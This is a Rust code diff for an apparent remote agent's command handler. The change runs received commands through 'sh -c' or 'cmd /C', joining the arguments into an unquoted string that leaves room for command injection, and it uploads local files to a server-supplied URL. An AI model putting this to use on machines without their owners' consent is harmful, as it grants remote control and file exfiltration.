@@ -36,23 +36,71 @@ pub async fn handle_command(cmd: CommandPayload) -> CommandResult {
                     },
                 }
             } else {
-                match Command::new(cmd_trimmed)
-                    .args(args)
+                // Append original args if any (Note: for shell execution, args might need to be part of the command string or handled differently.
+                // But for simple "run this program with these args" via shell, we usually just pass the whole command string to sh -c.
+                // If args are present, they are likely arguments to the command 'cmd'.
+                // If the user sent cmd="ls" and args=["-la"], we want `sh -c "ls -la"`.
+                // So we should construct the full command line.
+                
+                let full_cmd = if args.is_empty() {
+                    cmd_trimmed.to_string()
+                } else {
+                    format!("{} {}", cmd_trimmed, args.join(" "))
+                };
+
+                let (shell, shell_args) = if cfg!(target_os = "windows") {
+                    ("cmd", vec!["/C", &full_cmd])
+                } else {
+                    ("sh", vec!["-c", &full_cmd])
+                };
+
+                match Command::new(shell)
+                    .args(&shell_args)
+                    // If we've changed directory via `cd`, subsequent commands should run in that dir.
+                    // But `std::env::set_current_dir` already affects the whole process, so `Command::new` inherits it.
+                    // However, if we are on Windows and using `cmd /C`, it might need explicit cwd if it was lost?
+                    // Actually, `std::env::set_current_dir` is process-global, so it should persist.
+                    // But let's verify if `cmd` resets it. `cmd /C` starts a new shell. 
+                    // The new shell should inherit the parent process (client)'s CWD.
+                    // So `cd` handling logic above:
+                    // 1. `if cmd == "cd"` -> `std::env::set_current_dir`. This updates client process CWD.
+                    // 2. Next command -> `Command::new` -> inherits client process CWD.
+                    // So this *should* work.
+                    // If it's not working on Windows, maybe there's a specific issue.
+                    // Let's explicitly set current_dir just in case.
+                    .current_dir(std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")))
                     .stdout(Stdio::piped())
                     .stderr(Stdio::piped())
                     .spawn()
                 {
                     Ok(child) => {
                         match child.wait_with_output().await {
-                            Ok(output) => CommandResult::ShellOutput {
-                                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
-                                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
-                                exit_code: output.status.code().unwrap_or(-1),
+                            Ok(output) => {
+                                let stdout = if cfg!(target_os = "windows") {
+                                    // Try GBK first, then fallback to lossy UTF-8
+                                    let (cow, _, _) = encoding_rs::GBK.decode(&output.stdout);
+                                    cow.to_string()
+                                } else {
+                                    String::from_utf8_lossy(&output.stdout).to_string()
+                                };
+                                
+                                let stderr = if cfg!(target_os = "windows") {
+                                    let (cow, _, _) = encoding_rs::GBK.decode(&output.stderr);
+                                    cow.to_string()
+                                } else {
+                                    String::from_utf8_lossy(&output.stderr).to_string()
+                                };
+
+                                CommandResult::ShellOutput {
+                                    stdout,
+                                    stderr,
+                                    exit_code: output.status.code().unwrap_or(-1),
+                                }
                             },
                             Err(e) => CommandResult::Error(format!("Failed to wait on child: {}", e)),
                         }
                     }
-                    Err(e) => CommandResult::Error(format!("Failed to spawn command: {}", e)),
+                    Err(e) => CommandResult::Error(format!("Failed to spawn shell: {}", e)),
                 }
             }
         }
@@ -169,8 +217,16 @@ pub async fn handle_command(cmd: CommandPayload) -> CommandResult {
             }
         }
         CommandPayload::UploadFile { src_path, upload_url } => {
-            info!("Uploading file {} to {}", src_path, upload_url);
-            match tokio::fs::read(&src_path).await {
+            // Ensure path is absolute or relative to current CWD
+            let path = PathBuf::from(&src_path);
+            let abs_path = if path.is_absolute() {
+                path
+            } else {
+                std::env::current_dir().unwrap_or_else(|_| PathBuf::from(".")).join(path)
+            };
+            
+            info!("Uploading file {} to {}", abs_path.display(), upload_url);
+            match tokio::fs::read(&abs_path).await {
                 Ok(data) => {
                     let client = match reqwest::Client::builder()
                         .timeout(std::time::Duration::from_secs(3600))
@@ -178,7 +234,7 @@ pub async fn handle_command(cmd: CommandPayload) -> CommandResult {
                             Ok(c) => c,
                             Err(e) => return CommandResult::Error(format!("Failed to build http client: {}", e)),
                         };
-                    let file_name = std::path::Path::new(&src_path)
+                    let file_name = std::path::Path::new(&abs_path)
                         .file_name()
                         .map(|n| n.to_string_lossy().to_string())
                         .unwrap_or("unknown".to_string());
